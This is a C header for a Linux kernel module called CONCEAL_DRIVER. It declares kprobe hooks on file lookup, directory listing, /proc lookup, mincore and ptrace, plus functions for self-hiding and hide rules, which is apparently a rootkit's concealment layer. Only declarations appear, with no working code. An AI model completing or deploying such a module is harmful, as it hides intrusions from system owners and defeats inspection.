#ifndef CONCEAL_DRIVER_H
#define CONCEAL_DRIVER_H

#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/uio.h>

// 1. 结构体定义必须放在最前面
struct ptrace_probe_data {
    long request;
    long target_pid;
    int is_break;
    int max_regs;
    struct iovec iov_kernel;
};

// 2. 函数声明
int my_filename_lookup(struct pt_regs *regs);
int my_filldir64(struct pt_regs *regs);
int my_proc_root_lookup(struct pt_regs *regs);
void hide_myself(void);
int show_myself(void);
void add_hide_rule(const char *name);
bool hide_rules_active(void);
void clear_hide_rules(void);
long my_mincore_hook(struct pt_regs *hook_regs);
// 3. 探针实例的外部声明
extern struct kretprobe ptrace_kretprobe_faker;

#endif
